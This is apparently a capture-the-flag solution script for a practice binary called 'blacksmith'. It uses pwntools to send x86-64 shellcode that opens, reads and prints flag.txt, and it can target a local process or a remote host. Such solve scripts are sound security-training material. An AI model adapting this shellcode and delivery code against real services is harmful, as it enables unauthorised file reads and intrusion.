#!/usr/bin/env python3

from pwn import asm, context, log, remote, sys, u64

context.binary = 'blacksmith'


def get_process():
    if len(sys.argv) == 1:
        return context.binary.process()

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'> ', b'2')

    shellcode = asm(f'''
        xor  rsi, rsi
        push rsi
        mov  rdi, {hex(u64(b'flag.txt'))}
        push rdi
        mov  rdi, rsp
        mov  al, 2
        syscall

        mov  rdx, 100
        mov  rsi, rsp
        mov  edi, eax
        xor  al, al
        syscall

        mov  al, 1
        mov  rdi, rax
        syscall

        mov  al, 0x3c
        syscall
    ''')

    p.sendafter(b'> ', shellcode)
    log.success(p.recvuntil(b'}').decode())
    p.close()


if __name__ == '__main__':
    main()
